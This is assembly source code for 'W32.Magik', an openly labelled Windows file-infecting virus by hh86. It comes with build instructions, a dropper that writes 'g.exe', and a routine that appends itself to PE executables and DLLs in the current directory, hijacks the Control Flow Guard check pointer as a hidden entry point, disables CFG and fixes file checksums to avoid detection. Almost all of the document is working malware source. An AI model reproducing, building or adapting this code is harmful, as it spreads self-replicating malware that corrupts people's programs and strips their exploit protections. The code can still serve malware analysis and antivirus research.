;W32.Magik by hh86
;
;some of its features:
;- parasitic resident (own process) infector of PE exe and dll (but not looking at suffix)
;- infects files in current directory
;- new EPO for Intel 386 files:
;       hooks the Control Flow Guard function
;- last section appender
;- uses CRCs instead of API names
;- uses SEH for common code exit
;- supports ASLR/DEP/SafeSEH/CFG enabled files
;- no infect files with data outside of image (eg infected files, self-extractors)
;- correct file checksum without using imagehlp.dll :) 100% correct algorithm by rgb
;----
;
;yes, this a W64.Senshi remake for PE32 files, and a new encoder
;
;to build this thing:
;yasm
;----
;yasm -f win32 -o magik.obj magik.asm
;link magik.obj /defaultlib:kernel32.lib /defaultlib:user32.lib /entry:main /section:.text,erw /subsystem:console /largeaddressaware:no /fixed
;---
;
;Young eagle, rise in the air!
;  You stared at the sun!
;My light and delicate gaze can't compare
;
;I stood, more tender than those
;  Who've witnessed you disappear...
;I'm kissing you now - across
;  The gap of a thousand years.
;Marina Tsvetaeva (1916)

bits32

extern _MessageBoxA@16:proc
extern _ExitProcess@4:proc

%include "magik.inc"

global _main
section .text
_main:
        mov     edx, dllcrcstk_size >> 2
        mov     ebx, dllnames
        mov     edi, dllcrcbegin
        call    create_crcs
        mov     edx, krncrcstk_size >> 2
        mov     ebx, krnnames
        mov     edi, krncrcbegin
        call    create_crcs
        call    magik_execode
        xor     eax, eax
        push    eax
        push    eax
        push    title
        push    message
        push    eax
        call    _MessageBoxA@16
        call    _ExitProcess@4

create_crcs:
        or      eax, -1

create_outer:
        xor     al, byte [ebx]
        push    8
        pop     ecx

create_inner:
        shr     eax, 1
        jnc     create_skip
        xor     eax, 0edb88320h

create_skip:
        loop    create_inner
        inc     ebx
        cmp     byte [ebx], cl
        jne     create_outer
        not     eax
        stosd
        inc     ebx
        dec     edx
        jne     create_crcs
        ret

;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;main virus body.  everything happens in here
;-----------------------------------------------------------------------------

magik_inf:
        call    init_kernel32

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin:
        times   krncrcstk_size >> 2 dd 0
        db      0
;       db      "Magik - hh86"               ;sister, is this a glitch?
        int3
        mov     ebx, ecx

;-----------------------------------------------------------------------------
;find files in current directory only
;-----------------------------------------------------------------------------

        enter   WIN32_FIND_DATA_size, 0
        push    '*'
        mov     edi, esp
        push    edi
        push    edi
        call    dword [ebp + 4 + krncrcstk.kFindFirstFileW]
        push    eax

test_dir:
        pop     eax
        push    eax
        push    edi
        push    eax
        test    byte [edi + WIN32_FIND_DATA.dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
        jne     find_next
        lea     edx, dword [ebx + FILE_ATTRIBUTE_ARCHIVE]
        call    set_fileattr
        call    open_file

find_next:
        call    dword [ebp + 4 + krncrcstk.kFindNextFileW]
        dec     eax
        je      test_dir
        call    dword [ebp + 4 + krncrcstk.kFindClose]
        call    dword [ebp + 4 + krncrcstk.kExitProcess]

open_file:                                   ;esi = file name, ebp -> platform APIs
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    FILE_READ_DATA | FILE_WRITE_DATA
        push    esi
        call    dword [ebp + 4 + krncrcstk.kCreateFileW]
        lea     ecx, dword [edi + WIN32_FIND_DATA.ftLastWriteTime]
        lea     edx, dword [edi + WIN32_FIND_DATA.ftLastAccessTime]
        push    eax                          ;CloseHandle
        push    ecx                          ;SetFileTime
        push    edx                          ;SetFileTime
        push    ebx                          ;SetFileTime
        push    eax                          ;SetFileTime
        push    eax                          ;SetEndOfFile
        xchg    eax, esi
        call    map_view
        push    ebx
        push    ebx
        push    dword [edi + WIN32_FIND_DATA.dwFileSizeLow]
        push    esi
        call    dword [ebp + 4 + krncrcstk.kSetFilePointer]
        call    dword [ebp + 4 + krncrcstk.kSetEndOfFile]
        call    dword [ebp + 4 + krncrcstk.kSetFileTime]
        call    dword [ebp + 4 + krncrcstk.kCloseHandle]

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

        mov     edx, dword [edi + WIN32_FIND_DATA.dwFileAttributes]

set_fileattr:                                ;edx = file attributes, edi -> find data, ebp -> platform APIs
        lea     esi, dword [edi + WIN32_FIND_DATA.cFileName]
        push    edx
        push    esi
        call    dword [ebp + 4 + krncrcstk.kSetFileAttributesW]
        ret                                  ;esi -> file name
        db      "27/11/18"                   ;I knew that it could be done!
 
;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view:                                    ;esi = file handle, edi -> find data, ebp -> platform APIs
        mov     edx, dword [edi + WIN32_FIND_DATA.dwFileSizeLow]
        add     edx, CODESIZE + 1
        push    ebx
        push    edx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    esi
        call    dword [ebp + 4 + krncrcstk.kCreateFileMappingW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    dword [ebp + 4 + krncrcstk.kMapViewOfFile]
        push    eax
        pushad                               ;SEH destroys all registers
        call    infect_file
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        fs pop  dword [eax]
        pop     eax
        popad
        call    dword [ebp + 4 + krncrcstk.kUnmapViewOfFile]
        call    dword [ebp + 4 + krncrcstk.kCloseHandle]
        ret

init_kernel32:
        mov     eax, dword [ebx + pebLdr]    ;ebx = fs:[30h] at start time
        mov     esi, dword [eax + ldrInLoadOrderModuleList]
        lodsd
        xchg    esi, eax
        lodsd
        mov     ebp, dword [eax + mlDllBase]
        
;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

parse_exports:
        pop     esi
        mov     ebx, ebp
        mov     eax, dword [ebp + mzhdr.mzlfanew]
        add     ebx, dword [ebp + eax + pehdr.peexport + pedir.dirrva]
        cdq

walk_names:
        mov     eax, ebp
        mov     edi, ebp
        inc     edx
        add     eax, dword [ebx + peexp.expnamerva]
        add     edi, dword [eax + edx * 4]
        or      eax, -1

crc_outer:
        xor     al, byte [edi]
        push    8
        pop     ecx

crc_inner:
        shr     eax, 1
        jnc     crc_skip
        xor     eax, 0edb88320h

crc_skip:
        loop    crc_inner
        inc     edi
        cmp     byte [edi], cl
        jne     crc_outer
        not     eax
        cmp     dword [esi], eax
        jne     walk_names

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        mov     edi, ebp
        mov     eax, ebp
        add     edi, dword [ebx + peexp.expordrva]
        movzx   edi, word [edi + edx * 2]
        add     eax, dword [ebx + peexp.expadrrva]
        mov     eax, dword [eax + edi * 4]
        add     eax, ebp
        push    eax
        lodsd
        sub     cl, byte [esi]
        jnz     walk_names
        inc     esi
        jmp     esi

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, Intel 386, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect:                                 ;edi = find data, esi = map view, ebx = 0, ebp -> platform APIs
        cmp     word [esi], 'MZ'
        jne     test_ret
        mov     eax, dword [esi + mzhdr.mzlfanew]
        lea     eax, dword [esi + eax + pehdr.peheapsize]
        cmp     dword [eax + pehdr.pesig - pehdr.peheapsize], 'PE'
        jne     test_ret

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

        cmp     word [eax + pehdr.pecoff + coffhdr.pemachine - pehdr.peheapsize], IMAGE_FILE_MACHINE_I386
        jne     test_ret
        test    byte [eax + pehdr.pecoff + coffhdr.peflags - pehdr.peheapsize], IMAGE_FILE_EXECUTABLE_IMAGE
        je      test_ret
        cmp     word [eax + pehdr.pemagic - pehdr.peheapsize], IMAGE_NT_OPTIONAL_HDR32_MAGIC
        jne     test_ret
        movzx   edx, word [eax + pehdr.pecoff + coffhdr.peopthdrsize - pehdr.peheapsize]
        cmp     dx, pehdr.peconfig - pehdr.pemagic
        jb      test_ret

;-----------------------------------------------------------------------------
;ignore any other type except CUI/GUI
;-----------------------------------------------------------------------------

        mov     ecx, dword [eax + pehdr.pesubsys - pehdr.peheapsize]
        dec     ecx
        dec     ecx
        cmp     cx, IMAGE_SUBSYSTEM_WINDOWS_GUI - 1
        jnbe    test_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword [eax + pehdr.pesecurity - pehdr.peheapsize], ebx
        jne     test_ret

;-----------------------------------------------------------------------------
;don't infect files with data outside the image (eg infected files, self-extractors, etc)
;-----------------------------------------------------------------------------

        push    esi
        lea     esi, dword [eax + edx + pehdr.pemagic - pehdr.peheapsize]
        imul    dx, word [eax + pehdr.pecoff + coffhdr.pesectcount - pehdr.peheapsize], pesect_size
        lea     esi, dword [esi + edx - pesect_size]
        mov     ebx, dword [esi + pesect.sectrawaddr]
        add     ebx, dword [esi + pesect.sectrawsize]
        add     edi, WIN32_FIND_DATA.dwFileSizeLow
        cmp     dword [edi], ebx
        jne     test_ret                     ;file contains appended data

;-----------------------------------------------------------------------------
;don't infect files with virtual size larger than raw size: it may be a buffer
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        mov     ecx, dword [esi + pesect.sectvirtsize]
        cmp     dword [esi + pesect.sectrawsize], ecx
        jb      test_ret                     ;last section may have a buffer
        pop     ebx
        mov     ecx, dword [eax + pehdr.peconfig + pedir.dirrva - pehdr.peheapsize]
        jecxz   test_ret
        call    rva2raw
        cmp     dword [ecx], GuardFlags + 4
        jb      test_ret
        push    ecx
        mov     ecx, dword [ecx + GuardCFCheckFunctionPointer]
        jecxz   test_ret
        sub     ecx, dword [eax + pehdr.peimagebase - pehdr.peheapsize]
        call    rva2raw
        pop     ebx
        ret

test_ret:
        int3

;-----------------------------------------------------------------------------
;convert relative virtual address to raw file offset
;-----------------------------------------------------------------------------

rvaloop:
        sub     esi, pesect_size
        db      3ch                          ;mask PUSH ESI

rva2raw:                                     ;ecx = RVA, esi -> last section header
        push    esi
        cmp     dword [esi + pesect.sectvirtaddr], ecx
        jnbe    rvaloop
        sub     ecx, dword [esi + pesect.sectvirtaddr]
        add     ecx, dword [esi + pesect.sectrawaddr]
        add     ecx, ebx
        pop     esi
        ret

;-----------------------------------------------------------------------------
;infect file
;algorithm:     append last section and insert virus code there, image size is
;               increased. file size only increases by the size of the virus code
;               and a single byte to prevent re-infection
;               the code supports ASLR/SafeSEH/DEP enabled files
;               CFG is disabled
;               CFG check function pointer is altered.  very simple
;-----------------------------------------------------------------------------

infect_file:
        fs push dword [ebx]
        fs mov  dword [ebx], esp
        xchg    eax, esi
        push    esi
        call    test_infect
        pop     ebp
        push    edi
        push    ebx
        push    ecx
        push    ebp
        mov     ebp, dword [esi + pesect.sectrawsize]
        mov     ecx, CODESIZE
        add     dword [esi + pesect.sectrawsize], ecx
        inc     ecx                          ;prevents re-infection
        add     dword [edi], ecx
        add     dword [esi + pesect.sectvirtsize], ecx
        mov     edi, dword [esi + pesect.sectvirtsize]
        mov     ebx, dword [eax + pehdr.pesectalign - pehdr.peheapsize]
        dec     ebx
        add     edi, ebx
        not     ebx
        and     edi, ebx                     ;section align virtual size
        add     edi, dword [esi + pesect.sectvirtaddr]
        mov     dword [eax + pehdr.peimagesize - pehdr.peheapsize], edi

;-----------------------------------------------------------------------------
;section attributes are always altered to writable because we need to patch our entry point code
;the write bit could be set at runtime but we lost anti-heuristic already
;-----------------------------------------------------------------------------

        or      byte [esi + pesect.sectflags + 3], (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE) >> 18h

;-----------------------------------------------------------------------------
;copy code to last section
;-----------------------------------------------------------------------------

        pop     ebx
        mov     edi, dword [esi + pesect.sectrawaddr]
        add     edi, ebp
        add     edi, ebx
        add     ebp, dword [esi + pesect.sectvirtaddr]
        call    delta_inf

delta_inf:
        pop     esi
        sub     esi, delta_inf - magik_inf
        push    edi
        rep     movsb
        pop     edi

;-----------------------------------------------------------------------------
;alter function pointer
;-----------------------------------------------------------------------------

        pop     esi
        add     ebp, dword [eax + pehdr.peimagebase - pehdr.peheapsize]
        add     ebp, magik_execode - magik_inf
        mov     dword [esi], ebp
        pop     edi
        and     byte [eax + pehdr.pedllflags + 1 - pehdr.peheapsize], (~IMAGE_DLLCHARACTERISTICS_GUARD_CF) >> 8
                                             ;disable CFG
        mov     dword [edi + GuardCFCheckFunctionPointer], ecx
                                             ;erase VA to function pointer

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xchg    dword [eax + pehdr.pechksum - pehdr.peheapsize], ecx
        jecxz   infect_ret
        pop     edi
        mov     ecx, dword [edi]
        mov     edi, ecx
        xor     esi, esi
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum:
        adc     si, word [ebx]
        inc     ebx
        inc     ebx
        loop    calc_checksum
        adc     esi, edi
        mov     dword [eax + pehdr.pechksum - pehdr.peheapsize], esi
                                             ;avoid common bug.  ADC not ADD
infect_ret:
        int3                                 ;common exit using SEH

magik_execode:
        pushad
        xor     ebx, ebx
        fs mov  ebx, dword [ebx + 30h]
        call    init_kernel32

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

dllcrcbegin:
        times   dllcrcstk_size >> 2 dd 0
        db      0
        push    SectionSize + 200h
        mov     ebp, esp
        push    dword [ebp]
        push    GMEM_ZEROINIT
        call    dword [ebp + 4 + dllcrcstk.dGlobalAlloc]
        test    eax, eax
        je      magik_exeret
        push    eax                          ;GlobalFree
        xor     ebx, ebx
        push    ebx                          ;WriteFile
        push    esp                          ;WriteFile
        push    dword [ebp]                  ;WriteFile
        push    eax                          ;WriteFile
        push    ebx                          ;CreateFileA
        push    ebx                          ;CreateFileA
        push    CREATE_ALWAYS                ;CreateFileA
        push    ebx                          ;CreateFileA
        push    ebx                          ;CreateFileA
        push    FILE_WRITE_DATA              ;CreateFileA
        push    eax
        xchg    eax, edi
        call    skip_exe

copy_bytes:
        lodsw
        mov     bl, ah
        mov     byte [edi + ebx], al
        inc     ah
        jne     copy_bytes
        ret

magik_exe:
pehdrbase       equ     0ch
opthdrsize      equ     pehdr.pebound - pehdr.pemagic
        db      'M', 0, 'Z', 1, pehdrbase, mzhdr.mzlfanew, 'P', pehdrbase, 'E', (pehdrbase + 1), IMAGE_FILE_MACHINE_I386 >> 8, pehdrbase + pehdr.pecoff + coffhdr.pemachine + 1, IMAGE_FILE_MACHINE_I386 & 1ffh, pehdrbase + pehdr.pecoff + coffhdr.pemachine, SectionCount, pehdrbase + pehdr.pecoff + coffhdr.pesectcount, opthdrsize, pehdrbase + pehdr.pecoff + coffhdr.peopthdrsize, IMAGE_FILE_EXECUTABLE_IMAGE, pehdrbase + pehdr.pecoff + coffhdr.peflags, IMAGE_FILE_32BIT_MACHINE >> 8, pehdrbase + pehdr.pecoff + coffhdr.peflags + 1
ldcfgsize       equ    5ch
relocssize      equ    0ch
        db      1, pehdrbase + pehdr.pemagic + 1, 0bh, pehdrbase + pehdr.pemagic, SectionRVA >> 8, pehdrbase + pehdr.peentrypoint + 1, ldcfgsize + relocssize, pehdrbase + pehdr.peentrypoint, ImageBase >> 10h, pehdrbase + pehdr.peimagebase + 2, SectionAlignment >> 8, pehdrbase + pehdr.pesectalign + 1, FileAlignment >> 8, pehdrbase + pehdr.pefilealign + 1, 6, pehdrbase + pehdr.pemajorsubsys, 2, pehdrbase + pehdr.peimagesize + 2, 2, pehdrbase + pehdr.pehdrsize + 1, IMAGE_SUBSYSTEM_WINDOWS_GUI, pehdrbase + pehdr.pesubsys, 41h, pehdrbase + pehdr.pedllflags + 1, 40h, pehdrbase + pehdr.pedllflags, (pehdr.pebound - pehdr.peexport) / 8, pehdrbase + pehdr.pervacount,
        db      10h, pehdrbase + pehdr.pereloc + pedir.dirrva + 1, 5ch, pehdrbase + pehdr.pereloc + pedir.dirrva, 0ch, pehdrbase + pehdr.pereloc + pedir.dirsize
        db      10h, pehdrbase + pehdr.peconfig + pedir.dirrva + 1, ldcfgsize, pehdrbase + pehdr.peconfig + pedir.dirsize
        db      SectionRVA >> 8, pehdrbase + 18h + opthdrsize + pesect.sectvirtaddr + 1, SectionSize >> 8, pehdrbase + 18h + opthdrsize + pesect.sectrawsize + 1, 2, pehdrbase + 18h + opthdrsize + pesect.sectrawaddr + 1
        db      0, 0ffh
ldcfgbase       equ     0
        db      ldcfgsize, ldcfgbase, ImageBase >> 10h, ldcfgbase + GuardCFCheckFunctionPointer + 2, SectionRVA >> 8, ldcfgbase + GuardCFCheckFunctionPointer + 1, ldcfgsize + relocssize + 1, ldcfgbase + GuardCFCheckFunctionPointer, ImageBase >> 10h, GuardCFFunctionTable + 2, 2000h >> 8, GuardCFFunctionTable + 1, (IMAGE_GUARD_CF_INSTRUMENTED | IMAGE_GUARD_CF_FUNCTION_TABLE_PRESENT) >> 8, GuardFlags + 1
relocsbase      equ     ldcfgbase + ldcfgsize
        db      SectionRVA >> 8, ldcfgsize + 1, relocssize, relocsbase + 4, IMAGE_REL_BASED_HIGHLOW << 4, relocsbase + 8 + 1, ldcfgbase + GuardCFCheckFunctionPointer, relocsbase + 8, IMAGE_REL_BASED_HIGHLOW << 4, relocsbase + 0ah + 1, ldcfgbase + GuardCFFunctionTable, relocsbase + 0ah
        db      0, 0ffh
        
;decompressed data follow
;       db      'M', 'Z'                     ;00
;       times   0ah db 0                     ;02
;       db      'P', 'E', 0, 0               ;0c
;       dw      14ch                         ;10 machine
;       dw      1                            ;12 number of sections
;       dd      0                            ;14 date/time stamp
;       dd      0                            ;18 pointer to symbol table
;       dd      0                            ;1c number of symbols
;       dw      opthdr_end - opthdr_begin    ;20 size of optional header
;       dw      102h                         ;22 characteristics
;opthdr_begin:
;       dw      10bh                         ;24 magic
;       db      0                            ;26 major linker
;       db      0                            ;27 minor linker
;       dd      0                            ;28 size of code
;       dd      0                            ;2c size of init data
;       dd      0                            ;30 size of uninit data
;       dd      1068h                        ;34 entry point (must be aligned)
;       dd      0                            ;38 base of code
;       dd      0ch                          ;3c base of data (overload for lfanew)
;       dd      400000h                      ;40 image base
;       dd      1000h                        ;44 section align
;       dd      200h                         ;48 file align
;       dw      0                            ;4c major os
;       dw      0                            ;4e minor os
;       dw      0                            ;50 major image
;       dw      0                            ;52 minor image
;       dw      6                            ;54 major subsys
;       dw      0                            ;56 minor subsys
;       dd      0                            ;58 reserved
;       dd      20000h                       ;5c size of image (bigger than needed)
;       dd      200h                         ;60 size of headers
;       dd      0                            ;64 checksum
;       dw      2                            ;68 subsystem
;       dw      4140h                        ;6a dll characteristics
;       dd      0                            ;6c size of stack reserve
;       dd      0                            ;70 size of stack commit
;       dd      0                            ;74 size of heap reserve
;       dd      0                            ;78 size of heap commit
;       dd      0                            ;7c loader flags
;       dd      0bh                          ;80 number of rva and sizes
;       dd      0, 0                         ;84 export
;       dd      0, 0                         ;8c import
;       dd      0, 0                         ;94 resource
;       dd      0, 0                         ;9c exception
;       dd      0, 0                         ;a4 certificate
;       dd      105ch, 0ch                   ;ac base reloc (begins after load config)
;       dd      0, 0                         ;b4 debug
;       dd      0, 0                         ;bc arch
;       dd      0, 0                         ;c4 reserved
;       dd      0, 0                         ;cc tls
;       dd      1000h, 5ch                   ;d4 config (begins with section)
;section_header:
;       dd      0, 0                         ;dc section name
;       dd      1f000h                       ;e4 section virtual size (bigger than needed)
;       dd      1000h                        ;e8 section virtual address
;       dd      SectionSize                  ;ec section file size (bigger than needed)
;       dd      200h                         ;f0 section file offset (last field, flags offset is 16-bits :( )
;load_config:
;       dd      5ch                          ;200 size (reloc_block - load_config)
;       times   44h db 0                     ;204 unused fields
;       dd      401069h                      ;248 CFG address of check-function pointer
;       dd      0                            ;24c CFG address of dispatch-function pointer
;       dd      402000h                      ;250 CFG function table
;       dd      x                            ;254 CFG function count
;       dd      500h                         ;258 CFG flags
;reloc_block:
;       dd      SectionRVA                   ;25c section rva
;       dd      guard_init - reloc_block     ;260 size of block
;       dw      3048h                        ;264 reloc type and rva
;       dw      3050h                        ;266 reloc type and rva

guard_init:
        mov     esi, "hh86"
        mov     esi, dword [esi + 2]
        mov     esi, dword [esi]
        mov     eax, dword [ebx + 8]          ;ebx = fs:[30h] at start time
        lea     edi, dword [eax + 1068h + magik_body - guard_init]
        add     ah, 30h
        shr     eax, 8
        lea     esi, dword [esi + eax * 4]
        mov     ecx, magik_end - magik_inf
        push    edi
        rep     movsb
        mov     esi, edi
        pop     edi

patch_opcode:
        movzx   eax, byte [esi]
        test    eax, eax
        je      magik_body
        inc     esi
        movzx   ecx, word [esi]
        inc     esi
        inc     esi
        mov     byte [edi + ecx], al
        jmp     patch_opcode

magik_body:

magik_name:
        db      "g.exe", 0

skip_exe:
        pop     edx
        lea     esi, dword [edx + magik_exe - copy_bytes]
        call    edx
        push    ebp
        mov     ah, 2
        add     edi, eax
        mov     ebp, edi
        call    edx
        lea     edi, dword [edi + ldcfgsize + relocssize]
        push    magik_body - guard_init
        pop     ecx
        rep     movsb
        add     edi, magik_end - magik_inf
        push    esi
        sub     esi, magik_body - magik_inf
        mov     ebx, ecx
        mov     edx, 4f44h                   ;map of invalid bits

find_bits:
        mov     al, byte [esi+ecx]
        aam     10h
        mov     bl, al
        bt      edx, ebx
        jc      store_entry
        mov     bl, ah
        bt      edx, ebx
        jc      store_entry

find_morebits:
        inc     ecx
        cmp     cx, magik_end - magik_inf
        jne     find_bits
        lea     edi, dword [ebp + 1000h]
        mov     ax, 1068h
        stosd
        mov     edx, 2ff8h

test_group:
        lodsd
        push    1fh
        pop     ebx

test_bits:
        add     edx, 8
        shr     eax, 1
        jnc     skip_zerobit
        mov     dword [edi], edx
        inc     dword [ebp + GuardCFFunctionTable + 4]
        scasd

skip_zerobit:
        dec     ebx
        jns     test_bits
        sub     ecx, 4
        jns     test_group
        pop     esi
        pop     ebp
        pop     edi
        mov     byte [edi + pehdrbase + 18h + opthdrsize + pesect.sectflags + 3], 0a0h
        mov     dword [edi + pehdrbase + 18h + opthdrsize + pesect.sectvirtsize], 1f000h
        push    esi
        call    dword [ebp + 4 + dllcrcstk.dCreateFileA]
        push    eax
        xchg    eax, esi
        call    dword [ebp + 4 + dllcrcstk.dWriteFile]
        push    esi       
        call    dword [ebp + 4 + dllcrcstk.dCloseHandle]
        call    dword [ebp + 4 + dllcrcstk.dGlobalFree]

magik_exeret:
        lea     esp, dword [ebp + 4 + dllcrcstk_size]
        popad
        ret

store_entry:
        aad     10h
        stosb
        mov     ax, cx
        stosw
        jmp     find_morebits

magik_end:
        times   "h" db 0

dllnames        db      "CloseHandle" , 0
                db      "CreateFileA" , 0
                db      "GetTickCount", 0
                db      "GlobalAlloc" , 0
                db      "GlobalFree"  , 0
                db      "WriteFile"   , 0

krnnames        db      "CloseHandle"       , 0
                db      "CreateFileMappingW", 0
                db      "CreateFileW"       , 0
                db      "ExitProcess"       , 0
                db      "FindClose"         , 0
                db      "FindFirstFileW"    , 0
                db      "FindNextFileW"     , 0
                db      "MapViewOfFile"     , 0
                db      "SetEndOfFile"      , 0
                db      "SetFileAttributesW", 0
                db      "SetFilePointer"    , 0
                db      "SetFileTime"       , 0
                db      "UnmapViewOfFile"   , 0

title           db      "Magik", 0
message         db      "now run g.exe", 0